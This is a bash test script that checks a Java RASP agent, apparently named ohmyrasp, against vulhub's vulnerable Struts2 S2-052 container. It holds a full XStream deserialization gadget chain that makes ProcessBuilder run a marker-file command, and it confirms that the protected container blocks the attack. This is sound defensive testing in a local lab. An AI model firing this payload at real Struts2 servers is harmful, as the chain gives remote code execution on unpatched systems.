#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_STRUTS2_S2052_IMAGE:-vulhub/struts2:2.5.12-rest-showcase}"
baseline_name="${OHMYRASP_VULHUB_STRUTS2_S2052_BASELINE_NAME:-ohmyrasp-vulhub-struts2-s2052-baseline}"
protected_name="${OHMYRASP_VULHUB_STRUTS2_S2052_PROTECTED_NAME:-ohmyrasp-vulhub-struts2-s2052-protected}"
baseline_port="${OHMYRASP_VULHUB_STRUTS2_S2052_BASELINE_PORT:-18546}"
protected_port="${OHMYRASP_VULHUB_STRUTS2_S2052_PROTECTED_PORT:-18547}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-struts2-s2-052-java8-baseline"
protected_dir="logs/vulhub-struts2-s2-052-java8-protected"
protected_log="${protected_dir}/events.jsonl"
marker="/tmp/ohmyrasp-s2052-success"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:8080" \
  "$image" >/dev/null

docker run -d --name "$protected_name" -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/orders.xhtml" || true)"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose Struts2 S2-052 orders page at ${port}" >&2
  exit 1
}

post_payload() {
  local port="$1"
  local output="$2"
  python3 - "$port" "$output" "$marker" <<'PY'
import http.client
import sys

port = int(sys.argv[1])
output = sys.argv[2]
marker = sys.argv[3]
xml = f"""<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>touch</string>
                        <string>{marker}</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
"""
body = xml.encode()
headers = {
    "Accept": "*/*",
    "Content-Type": "application/xml",
    "Content-Length": str(len(body)),
    "User-Agent": "ohmyrasp-s2-052",
}
connection = http.client.HTTPConnection("127.0.0.1", port, timeout=30)
try:
    connection.request("POST", "/orders/3/edit", body=body, headers=headers)
    response = connection.getresponse()
    content = response.read()
finally:
    connection.close()

with open(output, "wb") as handle:
    handle.write(f"HTTP/1.1 {response.status} {response.reason}\n".encode())
    for key, value in response.getheaders():
        handle.write(f"{key}: {value}\n".encode(errors="replace"))
    handle.write(b"\n")
    handle.write(content)
print(response.status)
PY
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

docker exec "$baseline_name" rm -f "$marker" >/dev/null
docker exec "$protected_name" rm -f "$marker" >/dev/null

if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in Struts2 S2-052 protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "Struts2 S2-052 protected startup/readiness produced a detection before the exploit request" >&2
  exit 1
fi

post_payload "$baseline_port" "${baseline_dir}/attack.response" >/dev/null
if ! docker exec "$baseline_name" test -e "$marker"; then
  sed -n '1,200p' "${baseline_dir}/attack.response" >&2 || true
  echo "baseline Struts2 S2-052 XML gadget did not create ${marker}" >&2
  exit 1
fi

post_payload "$protected_port" "${protected_dir}/attack.response" >/dev/null
if docker exec "$protected_name" test -e "$marker"; then
  echo "protected Struts2 S2-052 created ${marker} despite Java8 RASP" >&2
  exit 1
fi
for _ in $(seq 1 30); do
  if grep -q '"algorithm":"java8_command_execution_exploit_primitive".*"action":"block"' "$protected_log"; then
    echo "vulhub Struts2 S2-052 Java8 acceptance passed"
    exit 0
  fi
  sleep 1
done

cat "$protected_log" >&2
echo "missing java8_command_execution_exploit_primitive block event for Struts2 S2-052" >&2
exit 1
